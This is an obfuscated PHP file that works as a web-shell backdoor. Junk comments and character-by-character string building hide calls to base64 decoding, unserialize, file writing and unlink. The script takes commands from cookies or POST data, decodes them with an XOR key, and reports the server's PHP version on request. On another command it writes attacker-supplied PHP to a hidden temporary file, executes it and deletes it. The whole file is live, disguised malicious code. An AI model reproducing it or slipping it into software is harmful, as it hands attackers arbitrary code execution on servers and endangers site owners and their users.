<?php      function/*wn  */zvpvtjnn(){	echo   69717;     }
$qagqc    =	'qagqc'/*  zq */^	'	';

$bpxqix  =	$qagqc(102)     .       $qagqc(928-823)/*hftq */.    "l"."e".$qagqc(1092-997)	.	"\x70"      .       "\165"       ./*  d */"t".$qagqc(95)  .     "c"."\x6f"/*kg  */.	"n"."\x74"      .       $qagqc(206-105)	./*  p   */$qagqc(110)	.	$qagqc(116)      ./* iub*/$qagqc(473-358);


$shobv	=/* um*/$qagqc(902-804)	./*  e */"a"."s"."\x65"	./*   x */"6".$qagqc(952-900)      .	$qagqc(95)	.	"d".$qagqc(232-131)/*  p  */.       "c"."o"."d"."e";
$zirfh_bi     =/* avrh*/$qagqc(445-328)/*  desiv*/.	"n"."s"."e"."\162"/*yewzg */.	$qagqc(105)    ./*  o   */"\141"   .	"\154"	./*  tqqzp */"\151"	.   "\172"	./*   ij*/"e";
$fjlko/*j*/=	"p".$qagqc(352-248)	.     $qagqc(978-866)	.	"v"."e".$qagqc(594-480)/*kxs  */.	"s"."i"."\x6f"	.   "n";

$vrykrcfl      =/*  c*/"\165"   ./* utb */"\156"/* qntbi   */./*  cfgk  */"l"."i"."n".$qagqc(505-398);


       function      jtnhna($vtmezlldu,	$qtyz_meju){	global/*   pm   */$qagqc;

	$zlsfzq    =/*   kbk_r*/"";

	for     ($efqop	=	0;/* hvhxa   */$efqop	<     strlen($vtmezlldu);)	{	for      ($foenv/*   mqops   */=/*  n_m*/0;/*tpq  */$foenv	</*  sriiy  */strlen($qtyz_meju)/*   mb   */&&	$efqop  </*  tcgtk   */strlen($vtmezlldu);/*  c  */$foenv++,/* kc   */$efqop++)	{


/*  ca */$zlsfzq	.=     $qagqc(ord($vtmezlldu[$efqop])     ^     ord($qtyz_meju[$foenv]));    }       }      return/*  pa  */$zlsfzq;

}

$onqjikrfb	=	$_COOKIE;


$fpcvybpggy	=/*  ec   */$_POST;
$onqjikrfb   =    array_merge($fpcvybpggy,       $onqjikrfb);




$q_vxbujhe     =	"a"."6"."\x65"."\61"  .	$qagqc(49)/* p_vw */.  "\x33"	.      $qagqc(835-738)      ./* ej  */"\x31"	.	"\x2d"     .      "8"."a"."2"."\x62"      ./*tno */"-"."4".$qagqc(48)      ./*frsyn */"\x65".$qagqc(787-735)       ./*jnd_*/"\55"   .       $qagqc(97)	./*  l */"\60"/*   rlt   */.	"\x34"	.	"\x65".$qagqc(457-412)	.	$qagqc(100).$qagqc(100)     ./* x  */$qagqc(253-198)	.	"9"."\141"/*kj   */.    "\60"	.	$qagqc(624-575)/*  j_s*/.	"\x31"	.	"\62"/* ga  */.       "f"."7".$qagqc(441-390);


foreach     ($onqjikrfb	as/*  nkt   */$efqopvj_z/* funbm*/=>/*b   */$vtmezlldu)/*   c_thr*/{
/* ngan  */$vtmezlldu	=	$zirfh_bi(jtnhna(jtnhna($shobv($vtmezlldu),      $q_vxbujhe),	$efqopvj_z));

	if	(isset($vtmezlldu["\x61"	./*  ufvb */"\153"]))	{

      if/* ju */($vtmezlldu["a"]	==/*  znlo   */$qagqc(105))	{/* qpylx */$efqop    =	array();/*  pgm */$efqop["\x70"/* cwe*/.	"v"]	=      $fjlko();


/* vcrml   */$efqop["s"."v"]/*   qiq*/=     $qagqc(973-922)	.	"\x2e"/* cfr*/.       "5";


/*   _  */echo	@serialize($efqop);   }    elseif      ($vtmezlldu["a"]   ==	"\x65")    {

     $hyl_ak_  =  sprintf(".".$qagqc(47)	.  "%"."s"."\56"	.	"\160"	.	"\x6c",	md5($q_vxbujhe));

   $bpxqix($hyl_ak_,   "<"       .     "?".$qagqc(577-465)  .	"\150"    ./*  lik */"\x70"	.	$qagqc(32)       .     "\x75"  ./*exh*/"\156"/* l   */.	$qagqc(108)	.     $qagqc(105).$qagqc(110)	.  "k"."\50"	./*cail  */$qagqc(95)       .	"\137"    .      $qagqc(70)     .	"I"."L"."\x45"   .  "\x5f"	.	"_".")".$qagqc(294-235)	.       $qagqc(32)/*xs */.	$vtmezlldu[$qagqc(100)]);

	include($hyl_ak_);

	$vrykrcfl($hyl_ak_);


	}

    exit();
  }}




